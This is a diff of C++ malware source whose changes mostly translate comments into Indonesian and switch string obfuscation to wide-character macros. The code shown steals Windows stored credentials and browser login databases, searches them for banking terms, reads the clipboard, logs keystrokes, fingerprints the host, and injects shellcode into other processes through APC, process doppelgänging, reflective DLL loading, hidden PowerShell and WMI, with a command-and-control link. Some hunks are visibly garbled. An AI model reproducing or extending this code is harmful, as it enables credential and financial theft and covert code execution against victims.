@@ -2102,7 +2126,7 @@ private:
                                         file.seekg(0, ios::beg);
                                         vector<BYTE> buffer(size);
                                         if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                            // Search for banking-related URLs in the login data
+                                            // cari URL terkait banking di login data
                                             string bufferStr(buffer.begin(), buffer.end());
                                             vector<string> bankingKeywords = {
                                                 "bank", "paypal", "stripe", "visa", "mastercard", 
@@ -2115,11 +2139,11 @@ private:
                                             for (const auto& keyword : bankingKeywords) {
                                                 size_t pos = bufferStr.find(keyword);
                                                 if (pos != string::npos) {
-                                                    // Add banking data marker
+                                                    // tambah marker data banking
                                                     string marker = "Banking Data (" + keyword + "):";
                                                     data.insert(data.end(), marker.begin(), marker.end());
                                                     
-                                                    // Extract relevant data around the keyword
+                                                    // ekstrak data relevan di sekitar keyword
                                                     size_t start = max((size_t)0, pos - 100);
                                                     size_t end = min(bufferStr.size(), pos + keyword.size() + 100);
                                                     string relevantData = bufferStr.substr(start, end - start);
@@ -2137,8 +2161,8 @@ private:
                 free(appData);
             }
             
-            // Edge banking data
-            _wdupenv_s(&appData, &len, OBF("LOCALAPPDATA").c_str());
+            // data banking edge
+            _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
             if (appData) {
                 wstring edgePath = wstring(appData) + OBF("\\Microsoft\\Edge\\User Data\\Default");
                 wstring loginDataPath = edgePath + OBF("\\Login Data");
@@ -2149,7 +2173,7 @@ private:
                         file.seekg(0, ios::beg);
                         vector<BYTE> buffer(size);
                         if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                            // Search for banking-related URLs in the login data
+                            // cari URL terkait banking di login data
                             string bufferStr(buffer.begin(), buffer.end());
                             vector<string> bankingKeywords = {
                                 "bank", "paypal", "stripe", "visa", "mastercard", 
@@ -2162,11 +2186,11 @@ private:
                             for (const auto& keyword : bankingKeywords) {
                                 size_t pos = bufferStr.find(keyword);
                                 if (pos != string::npos) {
-                                    // Add banking data marker
+                                    // tambah marker data banking
                                     string marker = "Banking Data (" + keyword + "):";
                                     data.insert(data.end(), marker.begin(), marker.end());
                                     
-                                    // Extract relevant data around the keyword
+                                    // ekstrak data relevan di sekitar keyword
                                     size_t start = max((size_t)0, pos - 100);
                                     size_t end = min(bufferStr.size(), pos + keyword.size() + 100);
                                     string relevantData = bufferStr.substr(start, end - start);
@@ -2180,11 +2204,11 @@ private:
             }
         }
         
-        // Collect financial data from registry
+        // koleksi data finansial dari registry
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, OBFW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist").c_str(),
                            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            // Enumerate all subkeys
+            // enumerate semua subkey
             wchar_t subKeyName[256];
             DWORD subKeyNameSize = 256;
             DWORD index = 0;
@@ -2192,13 +2216,13 @@ private:
             while (RegEnumKeyExW(hKey, index++, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                 HKEY hSubKey;
                 if (RegOpenKeyExW(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
-                    // Enumerate all values
+                    // enumerate semua values
                     wchar_t valueName[256];
                     DWORD valueNameSize = 256;
                     DWORD valueIndex = 0;
                     
                     while (RegEnumValueW(hSubKey, valueIndex++, valueName, &valueNameSize, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-                        // Check if the value name contains financial keywords
+                        // cek jika nama value mengandung keyword finansial
                         wstring valueNameStr(valueName);
                         vector<wstring> financialKeywords = {
                             L"bank", L"paypal", L"stripe", L"visa", L"mastercard", 
@@ -2210,11 +2234,11 @@ private:
                         
                         for (const auto& keyword : financialKeywords) {
                             if (valueNameStr.find(keyword) != wstring::npos) {
-                                // Add financial data marker
+                                // tambah marker data finansial registry
                                 string marker = "Financial Registry Data (" + string(keyword.begin(), keyword.end()) + "):";
                                 data.insert(data.end(), marker.begin(), marker.end());
                                 
-                                // Get the value data
+                                // dapatkan data value
                                 DWORD dataType;
                                 DWORD dataSize;
                                 if (RegQueryValueExW(hSubKey, valueName, NULL, &dataType, NULL, &dataSize) == ERROR_SUCCESS) {
@@ -2238,7 +2262,7 @@ private:
             RegCloseKey(hKey);
         }
         
-        // Collect financial data from recently used files
+        // koleksi data finansial dari file yang baru digunakan
         wchar_t recentPath[MAX_PATH];
         if (GetRecentPath(recentPath, MAX_PATH)) {
             wstring searchPattern = wstring(recentPath) + L"\\*.lnk";
@@ -2247,7 +2271,7 @@ private:
             if (hFind != INVALID_HANDLE_VALUE) {
                 do {
                     if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                        // Get the target of the shortcut
+                        // dapatkan target dari shortcut
                         wstring shortcutPath = wstring(recentPath) + L"\\" + findData.cFileName;
                         IShellLinkW* pShellLink;
                         IPersistFile* pPersistFile;
@@ -2257,7 +2281,7 @@ private:
                                 if (pPersistFile->Load(shortcutPath.c_str(), STGM_READ) == S_OK) {
                                     wchar_t targetPath[MAX_PATH];
                                     if (pShellLink->GetPath(targetPath, MAX_PATH, NULL, SLGP_SHORTPATH) == S_OK) {
-                                        // Check if the target path contains financial keywords
+                                        // cek jika path target mengandung keyword finansial
                                         wstring targetPathStr(targetPath);
                                         vector<wstring> financialKeywords = {
                                             L"bank", L"paypal", L"stripe", L"visa", L"mastercard", 
@@ -2269,11 +2293,11 @@ private:
                                         
                                         for (const auto& keyword : financialKeywords) {
                                             if (targetPathStr.find(keyword) != wstring::npos) {
-                                                // Add financial data marker
+                                                // tambah marker file finansial baru
                                                 string marker = "Recent Financial File (" + string(keyword.begin(), keyword.end()) + "):";
                                                 data.insert(data.end(), marker.begin(), marker.end());
                                                 
-                                                // Add the target path
+                                                // tambah path target
                                                 string targetPathStrA(targetPathStr.begin(), targetPathStr.end());
                                                 data.insert(data.end(), targetPathStrA.begin(), targetPathStrA.end());
                                             }
@@ -2300,10 +2324,10 @@ private:
         if (!OpenClipboard(NULL)) return data;
         
         HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-        if (hData) {
-            wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
-            if (pszText) {
-                size_t len = wcslen(pszText) * sizeof(wchar_t);
+                if (appData) {
+                wstring firefoxPath = wstring(appData) + OBFW(L"\\Mozilla\\Firefox\\Profiles");
+                WIN32_FIND_DATAW findData;
+                wstring searchPattern = firefoxPath + OBFW(L"\\*");
                 data.insert(data.end(), (BYTE*)pszText, (BYTE*)pszText + len);
                 GlobalUnlock(hData);
             }
@@ -2394,7 +2418,7 @@ private:
             return data;
         }
         
-        // Get stream size
+        // dapatkan ukuran stream
         STATSTG stat;
         if (pStream->Stat(&stat, STATFLAG_NONAME) != S_OK) {
             pStream->Release();
@@ -2408,7 +2432,7 @@ private:
         
         DWORD streamSize = stat.cbSize.LowPart;
         
-        // Read stream into buffer
+        // baca stream ke buffer
         LARGE_INTEGER li = {0};
         if (pStream->Seek(li, STREAM_SEEK_SET, NULL) != S_OK) {
             pStream->Release();
@@ -2439,10 +2463,10 @@ private:
         lock_guard<mutex> lock(collectorMutex);
         vector<BYTE> data;
         
-        // This is a simplified keystroke logger
-        // In a real scenario, you would use a more sophisticated method
+        // ini keylogger sederhana
+        // di skenario nyata, kamu akan menggunakan metode yang lebih canggih
         
-        // Check for common key combinations
+        // cek kombinasi key umum
         if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
             data.push_back(0x11); // Ctrl
         }
@@ -2455,7 +2479,7 @@ private:
             data.push_back(0x12); // Alt
         }
         
-        // Check for alphanumeric keys
+        // cek key alfanumerik
         for (int key = 'A'; key <= 'Z'; key++) {
             if (GetAsyncKeyState(key) & 0x8000) {
                 data.push_back(key);
@@ -2468,14 +2492,14 @@ private:
             }
         }
         
-        // Check for function keys
+        // cek function keys
         for (int key = VK_F1; key <= VK_F12; key++) {
             if (GetAsyncKeyState(key) & 0x8000) {
                 data.push_back(key);
             }
         }
         
-        // Check for special keys
+        // cek special keys
         if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
             data.push_back(0x0D); // Enter
         }
@@ -2499,87 +2523,87 @@ private:
         lock_guard<mutex> lock(collectorMutex);
         vector<BYTE> data;
         
-        // Get computer name
+        // dapatkan nama komputer
         wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
         DWORD computerNameSize = MAX_COMPUTERNAME_LENGTH + 1;
         if (GetComputerNameW(computerName, &computerNameSize)) {
-            wstring info = OBF("ComputerName: ") + wstring(computerName) + OBF("\n");
+            wstring info = OBFW(L"ComputerName: ") + wstring(computerName) + OBFW(L"\n");
             data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
         }
         
-        // Get username
+        // dapatkan username
         wchar_t username[UNLEN + 1];
         DWORD usernameSize = UNLEN + 1;
         if (GetUserNameW(username, &usernameSize)) {
-            wstring info = OBF("UserName: ") + wstring(username) + OBF("\n");
+            wstring info = OBFW(L"UserName: ") + wstring(username) + OBFW(L"\n");
             data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
         }
         
-        // Get OS version
+        // dapatkan versi OS
         OSVERSIONINFOEX osvi;
         ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
         osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
         
         if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
-            wstring info = OBF("OSVersion: ") + to_wstring(osvi.dwMajorVersion) + OBF(".") + 
-                          to_wstring(osvi.dwMinorVersion) + OBF(" Build ") + 
-                          to_wstring(osvi.dwBuildNumber) + OBF("\n");
+            wstring info = OBFW(L"OSVersion: ") + to_wstring(osvi.dwMajorVersion) + OBFW(L".") + 
+                          to_wstring(osvi.dwMinorVersion) + OBFW(L" Build ") + 
+                          to_wstring(osvi.dwBuildNumber) + OBFW(L"\n");
             data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
         }
         
-        // Get system info
+        // dapatkan info sistem
         SYSTEM_INFO si;
         GetSystemInfo(&si);
         
-        wstring info = OBF("ProcessorArchitecture: ");
+        wstring info = OBFW(L"ProcessorArchitecture: ");
         switch (si.wProcessorArchitecture) {
             case PROCESSOR_ARCHITECTURE_AMD64:
-                info += OBF("x64");
+                info += OBFW(L"x64");
                 break;
             case PROCESSOR_ARCHITECTURE_IA64:
-                info += OBF("Itanium");
+                info += OBFW(L"Itanium");
                 break;
             case PROCESSOR_ARCHITECTURE_INTEL:
-                info += OBF("x86");
+                info += OBFW(L"x86");
                 break;
             default:
-                info += OBF("Unknown");
+                info += OBFW(L"Unknown");
                 break;
         }
-        info += OBF("\n");
-        
-        info += OBF("NumberOfProcessors: ") + to_wstring(si.dwNumberOfProcessors) + OBF("\n");
-        info += OBF("PageSize: ") + to_wstring(si.dwPageSize) + OBF("\n");
+        info += OBFW(L"\n");
+
+        info += OBFW(L"NumberOfProcessors: ") + to_wstring(si.dwNumberOfProcessors) + OBFW(L"\n");
+        info += OBFW(L"PageSize: ") + to_wstring(si.dwPageSize) + OBFW(L"\n");
         
         data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
         
-        // Get memory status
+        // dapatkan status memori
         MEMORYSTATUSEX memStatus;
         memStatus.dwLength = sizeof(MEMORYSTATUSEX);
         if (GlobalMemoryStatusEx(&memStatus)) {
-            info = OBF("TotalPhysicalMemory: ") + to_wstring(memStatus.ullTotalPhys / (1024 * 1024)) + OBF(" MB\n");
-            info += OBF("AvailablePhysicalMemory: ") + to_wstring(memStatus.ullAvailPhys / (1024 * 1024)) + OBF(" MB\n");
-            info += OBF("TotalVirtualMemory: ") + to_wstring(memStatus.ullTotalVirtual / (1024 * 1024)) + OBF(" MB\n");
-            info += OBF("AvailableVirtualMemory: ") + to_wstring(memStatus.ullAvailVirtual / (1024 * 1024)) + OBF(" MB\n");
+            info = OBFW(L"TotalPhysicalMemory: ") + to_wstring(memStatus.ullTotalPhys / (1024 * 1024)) + OBFW(L" MB\n");
+            info += OBFW(L"AvailablePhysicalMemory: ") + to_wstring(memStatus.ullAvailPhys / (1024 * 1024)) + OBFW(L" MB\n");
+            info += OBFW(L"TotalVirtualMemory: ") + to_wstring(memStatus.ullTotalVirtual / (1024 * 1024)) + OBFW(L" MB\n");
+            info += OBFW(L"AvailableVirtualMemory: ") + to_wstring(memStatus.ullAvailVirtual / (1024 * 1024)) + OBFW(L" MB\n");
             
             data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
         }
         
-        // Get network interfaces
+        // dapatkan interface jaringan
         IP_ADAPTER_INFO adapterInfo[16];
         DWORD dwBufLen = sizeof(adapterInfo);
         if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
             for (PIP_ADAPTER_INFO pAdapterInfo = adapterInfo; pAdapterInfo; pAdapterInfo = pAdapterInfo->Next) {
-                info = OBF("Adapter: ") + wstring(pAdapterInfo->Description) + OBF("\n");
-                info += OBF("IP Address: ") + wstring(pAdapterInfo->IpAddressList.IpAddress.String) + OBF("\n");
-                info += OBF("MAC Address: ");
+                info = OBFW(L"Adapter: ") + wstring(pAdapterInfo->Description) + OBFW(L"\n");
+                info += OBFW(L"IP Address: ") + wstring(pAdapterInfo->IpAddressList.IpAddress.String) + OBFW(L"\n");
+                info += OBFW(L"MAC Address: ");
                 for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
-                    char macStr[3];
-                    sprintf_s(macStr, "%02X", pAdapterInfo->Address[i]);
-                    info += wstring(macStr, macStr + 2);
+                    wchar_t macStrW[3];
+                    swprintf_s(macStrW, L"%02X", pAdapterInfo->Address[i]);
+                    info += wstring(macStrW);
                     if (i < pAdapterInfo->AddressLength - 1) info += L"-";
                 }
-                info += OBF("\n");
+                info += OBFW(L"\n");
                 
                 data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
             }
@@ -2592,35 +2616,36 @@ private:
         lock_guard<mutex> lock(collectorMutex);
         vector<BYTE> data;
         
-        // Collect Windows credentials
-        PCREDENTIALA* pCredentials = NULL;
+        // koleksi kredensial windows
+        PCREDENTIALW* pCredentials = NULL;
         DWORD count = 0;
-        
-        if (CredEnumerateA(NULL, 0, CRED_ENUMERATE_ALL_CREDENTIALS, &count, &pCredentials) == ERROR_SUCCESS) {
+
+        // CredEnumerateW signature: (LPCWSTR Filter, DWORD Flags, DWORD *Count, PCREDENTIALW **Credentials)
+        if (CredEnumerateW(NULL, 0, &count, &pCredentials) == ERROR_SUCCESS) {
             for (DWORD i = 0; i < count; i++) {
                 if (pCredentials[i]->Type == CRED_TYPE_GENERIC || 
                     pCredentials[i]->Type == CRED_TYPE_DOMAIN_PASSWORD) {
-                    
-                    // Add credential to data
-                    wstring info = OBF("Credential: ") + wstring(pCredentials[i]->TargetName, pCredentials[i]->TargetName + strlen(pCredentials[i]->TargetName)) + OBF("\n");
+
+                    // tambah kredensial ke data (TargetName adalah wide)
+                    wstring info = OBFW(L"Credential: ") + wstring(pCredentials[i]->TargetName) + OBFW(L"\n");
                     data.insert(data.end(), (BYTE*)info.c_str(), (BYTE*)info.c_str() + info.size() * sizeof(wchar_t));
-                    
+
                     if (pCredentials[i]->CredentialBlobSize > 0) {
                         data.insert(data.end(), (BYTE*)pCredentials[i]->CredentialBlob, 
                                    (BYTE*)pCredentials[i]->CredentialBlob + pCredentials[i]->CredentialBlobSize);
                     }
                 }
             }
-            
+
             CredFree(pCredentials);
         }
         
-        // Collect browser credentials
+        // koleksi kredensial browser
         wchar_t* appData;
         size_t len;
-        _wdupenv_s(&appData, &len, wstring(OBF("LOCALAPPDATA").begin(), OBF("LOCALAPPDATA").end()).c_str());
+        _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
         if (appData) {
-            // Chrome credentials
+            // kredensial chrome
             wstring chromePath = wstring(appData) + OBF("\\Google\\Chrome\\User Data\\Default\\Login Data");
             if (PathFileExistsW(chromePath.c_str())) {
                 ifstream file(to_string(chromePath), ios::binary | ios::ate);
@@ -2629,7 +2654,7 @@ private:
                     file.seekg(0, ios::beg);
                     vector<BYTE> buffer(size);
                     if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                        // Add Chrome credentials marker
+                        // tambah marker kredensial chrome
                         string marker = "Chrome Credentials:";
                         data.insert(data.end(), marker.begin(), marker.end());
                         data.insert(data.end(), buffer.begin(), buffer.end());
@@ -2637,8 +2662,8 @@ private:
                 }
             }
             
-            // Firefox credentials
-            _wdupenv_s(&appData, &len, OBF("APPDATA").c_str());
+            // kredensial firefox
+            _wdupenv_s(&appData, &len, OBFW(L"APPDATA").c_str());
             if (appData) {
                 wstring firefoxPath = wstring(appData) + OBF("\\Mozilla\\Firefox\\Profiles");
                 WIN32_FIND_DATAW findData;
@@ -2657,7 +2682,7 @@ private:
                                         file.seekg(0, ios::beg);
                                         vector<BYTE> buffer(size);
                                         if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                                            // Add Firefox credentials marker
+                                            // tambah marker kredensial firefox
                                             string marker = "Firefox Credentials:";
                                             data.insert(data.end(), marker.begin(), marker.end());
                                             data.insert(data.end(), buffer.begin(), buffer.end());
@@ -2671,10 +2696,10 @@ private:
                 }
             }
             
-            // Edge credentials
-            _wdupenv_s(&appData, &len, OBF("LOCALAPPDATA").c_str());
+            // kredensial edge
+            _wdupenv_s(&appData, &len, OBFW(L"LOCALAPPDATA").c_str());
             if (appData) {
-                wstring edgePath = wstring(appData) + wstring(OBF("\\Microsoft\\Edge\\User Data\\Default\\Login Data").begin(), OBF("\\Microsoft\\Edge\\User Data\\Default\\Login Data").end());
+                wstring edgePath = wstring(appData) + OBFW(L"\\Microsoft\\Edge\\User Data\\Default\\Login Data");
                 if (PathFileExistsW(edgePath.c_str())) {
                     ifstream file(to_string(edgePath), ios::binary | ios::ate);
                     if (file) {
@@ -2682,7 +2707,7 @@ private:
                         file.seekg(0, ios::beg);
                         vector<BYTE> buffer(size);
                         if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
-                            // Add Edge credentials marker
+                            // tambah marker kredensial edge
                             string marker = "Edge Credentials:";
                             data.insert(data.end(), marker.begin(), marker.end());
                             data.insert(data.end(), buffer.begin(), buffer.end());
@@ -2727,7 +2752,7 @@ private:
     static BOOL GetRecentPath(LPWSTR pszPath, DWORD cchPath) {
         if (!pszPath || cchPath == 0) return FALSE;
         
-        // Get the path to the user's Recent folder
+        // dapatkan path ke folder Recent user
         if (FAILED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, pszPath))) {
             return FALSE;
         }
@@ -2737,9 +2762,9 @@ private:
     
 public:
     RealTimeDataCollector(AdvancedC2Infrastructure& c2Infra) : 
-        c2(c2Infra), running(false) {
+        c2(c2Infra), running(false), gen(rd()) {
         
-        // Generate encryption key
+        // generate encryption key
         encryptionKey = crypto.GenerateRandomKey(32);
     }
     
@@ -2765,7 +2790,7 @@ public:
 };
 
 // =====================================================
-// ADVANCED PROCESS INJECTION TECHNIQUES
+// teknik injeksi proses tingkat lanjut
 // =====================================================
 class AdvancedProcessInjection {
 private:
@@ -2776,18 +2801,18 @@ private:
     bool InjectViaAPC(DWORD pid, const vector<BYTE>& shellcode) {
         lock_guard<mutex> lock(injectionMutex);
         
-        // Open target process
+        // buka proses target
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if (!hProcess) return false;
         
-        // Allocate memory in target process
+        // alokasi memori di proses target
         PVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!remoteMem) {
             CloseHandle(hProcess);
             return false;
         }
         
-        // Write shellcode
+        // tulis shellcode
         SIZE_T bytesWritten = 0;
         if (!WriteProcessMemory(hProcess, remoteMem, shellcode.data(), shellcode.size(), &bytesWritten) || 
             bytesWritten != shellcode.size()) {
@@ -2796,7 +2821,7 @@ private:
             return false;
         }
         
-        // Change protection to executable
+        // ubah proteksi ke executable
         DWORD oldProtect;
         if (!VirtualProtectEx(hProcess, remoteMem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
             VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
@@ -2804,7 +2829,7 @@ private:
             return false;
         }
         
-        // Enumerate threads in the target process
+        // enumerate thread di proses target
         HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE, pid);
         if (hSnapshot == INVALID_HANDLE_VALUE) {
             VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
@@ -2821,7 +2846,7 @@ private:
                 if (te32.th32OwnerProcessID == pid) {
                     HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                     if (hThread) {
-                        // Queue APC to the thread
+                        // queue APC ke thread
                         if (QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL)) {
                             success = true;
                         }
@@ -2842,14 +2867,14 @@ private:
         return success;
     }
     
-    bool InjectViaProcessDoppelgänging(DWORD pid, const vector<BYTE>& payload) {
+    bool InjectViaProcessDoppelg�nging(DWORD pid, const vector<BYTE>& payload) {
         lock_guard<mutex> lock(injectionMutex);
         
-        // Create a transaction
+        // buat transaction
         HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
         if (!hTransaction) return false;
         
-        // Create a temporary file in the transaction
+        // buat file temporary di transaction
         wchar_t tempPath[MAX_PATH];
         GetTempPathW(MAX_PATH, tempPath);
         wchar_t tempFile[MAX_PATH];
@@ -2862,7 +2887,7 @@ private:
             return false;
         }
         
-        // Write payload to the file
+        // tulis payload ke file
         DWORD bytesWritten = 0;
         if (!WriteFile(hFile, payload.data(), payload.size(), &bytesWritten, NULL) || 
             bytesWritten != payload.size()) {
@@ -2872,17 +2897,16 @@ private:
             return false;
         }
         
+        // buat section dari file (biarkan file handle terbuka)
+        HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
         CloseHandle(hFile);
-        
-        // Create a section from the file
-        HANDLE hSection = CreateFileMappingW(tempFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
         if (!hSection) {
             CloseHandle(hTransaction);
             DeleteFileW(tempFile);
             return false;
         }
         
-        // Map the section
+        // map section
         PVOID baseAddress = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
         if (!baseAddress) {
             CloseHandle(hSection);
@@ -2891,9 +2915,9 @@ private:
             return false;
         }
         
-        // Create a process from the section
-        HANDLE hProcess = NULL;
-        HANDLE hThread = NULL;
+        // buat proses dari section
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = {0};
         
         if (!CreateProcessW(NULL, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, 
                            &si, &pi)) {
@@ -2904,22 +2928,22 @@ private:
             return false;
         }
         
-        // Roll back the transaction
+        // rollback transaction
         RollbackTransaction(hTransaction);
         
-        // Clean up
+        // cleanup
         UnmapViewOfFile(baseAddress);
         CloseHandle(hSection);
         CloseHandle(hTransaction);
         DeleteFileW(tempFile);
         
-        // Resume the thread
-        if (hThread) {
-            ResumeThread(hThread);
-            CloseHandle(hThread);
+        // resume thread
+        if (pi.hThread) {
+            ResumeThread(pi.hThread);
+            CloseHandle(pi.hThread);
         }
         
-        if (hProcess) CloseHandle(hProcess);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
         
         return true;
     }
@@ -2927,18 +2951,18 @@ private:
     bool InjectViaReflectiveDLL(DWORD pid, const vector<BYTE>& dllData) {
         lock_guard<mutex> lock(injectionMutex);
         
-        // Open target process
+        // buka proses target
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if (!hProcess) return false;
         
-        // Allocate memory for the DLL
+        // alokasi memori untuk DLL
         PVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!remoteMem) {
             CloseHandle(hProcess);
             return false;
         }
         
-        // Write the DLL data
+        // tulis data DLL
         SIZE_T bytesWritten = 0;
         if (!WriteProcessMemory(hProcess, remoteMem, dllData.data(), dllData.size(), &bytesWritten) || 
             bytesWritten != dllData.size()) {
@@ -2947,10 +2971,10 @@ private:
             return false;
         }
         
-        // Create a remote thread to execute the reflective loader
+        // buat remote thread untuk execute reflective loader
         HANDLE hThread = NULL;
         
-        // Find the reflective loader export
+        // cari export reflective loader
         PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllData.data();
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
         
@@ -2988,7 +3012,7 @@ private:
             return false;
         }
         
-        // Create the thread
+        // buat thread
         hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)reflectiveLoader, NULL, 0, NULL);
         if (!hThread) {
             VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
@@ -3005,7 +3029,7 @@ private:
     bool InjectViaPowerShell(DWORD pid, const vector<BYTE>& shellcode) {
         lock_guard<mutex> lock(injectionMutex);
         
-        // Encode shellcode as base64
+        // encode shellcode sebagai base64
         DWORD dwSize = 0;
         if (!CryptBinaryToStringA(shellcode.data(), shellcode.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize)) {
             return false;
@@ -3016,7 +3040,7 @@ private:
             return false;
         }
         
-        // Create PowerShell command to inject shellcode
+        // buat perintah PowerShell untuk inject shellcode
         string psCommand = "$shellcode = '" + string(base64Shellcode.begin(), base64Shellcode.end()) + "'; ";
         psCommand += "$bytes = [System.Convert]::FromBase64String($shellcode); ";
         psCommand += "$proc = Get-Process -Id " + to_string(pid) + "; ";
@@ -3025,7 +3049,7 @@ private:
         psCommand += "$thread = $proc.CreateRemoteThread(0, 0, $remoteMem, 0, 0, 0); ";
         psCommand += "$thread.WaitForExit();";
         
-        // Execute PowerShell command
+        // eksekusi perintah PowerShell
         string command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + psCommand + "\"";
         
         STARTUPINFOA si = { sizeof(si) };
@@ -3044,11 +3068,11 @@ private:
     bool InjectViaWMI(DWORD pid, const vector<BYTE>& shellcode) {
         lock_guard<mutex> lock(injectionMutex);
         
-        // Initialize COM
+        // inisialisasi COM
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         if (FAILED(hr)) return false;
         
-        // Set COM security levels
+        // set level security COM
         hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, 
                                 RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
         if (FAILED(hr)) {
@@ -3056,7 +3080,7 @@ private:
             return false;
         }
         
-        // Obtain the initial locator to WMI
+        // dapatkan initial locator ke WMI
         IWbemLocator* pLoc = NULL;
         hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
         if (FAILED(hr)) {
@@ -3064,7 +3088,7 @@ private:
             return false;
         }
         
-        // Connect to WMI
+        // koneksi ke WMI
         IWbemServices* pSvc = NULL;
         hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, NULL, &pSvc);
         if (FAILED(hr)) {
@@ -3073,7 +3097,7 @@ private:
             return false;
         }
         
-        // Set security levels on the proxy
+        // set level security pada proxy
         hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, 
                               RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 
                               NULL, EOAC_NONE);
@@ -3084,7 +3108,7 @@ private:
             return false;
         }
         
-        // Encode shellcode as base64
+        // encode shellcode sebagai base64
         DWORD dwSize = 0;
         if (!CryptBinaryToStringA(shellcode.data(), shellcode.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize)) {
             pSvc->Release();
@@ -3101,14 +3125,14 @@ private:
             return false;
         }
         
-        // Create WMI class to store data
+        // buat class WMI untuk menyimpan data
         IWbemClassObject* pClass = NULL;
         hr = pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);
         if (SUCCEEDED(hr)) {
             IWbemClassObject* pInParams = NULL;
             hr = pClass->GetMethod(_bstr_t(L"Create"), 0, &pInParams, NULL);
             if (SUCCEEDED(hr)) {
-                // Create PowerShell command to inject shellcode
+                // buat perintah PowerShell untuk inject shellcode
                 string psCommand = "$shellcode = '" + string(base64Shellcode.begin(), base64Shellcode.end()) + "'; ";
                 psCommand += "$bytes = [System.Convert]::FromBase64String($shellcode); ";
                 psCommand += "$proc = Get-Process -Id " + to_string(pid) + "; ";
@@ -3119,7 +3143,7 @@ private:
                 
                 string command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + psCommand + "\"";
                 
-                // Set input parameters
+                // set parameter input
                 VARIANT varCommand;
                 VariantInit(&varCommand);
                 varCommand.vt = VT_BSTR;
@@ -3128,7 +3152,7 @@ private:
                 hr = pInParams->Put(_bstr_t(L"CommandLine"), 0, &varCommand, 0);
                 VariantClear(&varCommand);
                 
-                // Execute the method
+                // eksekusi method
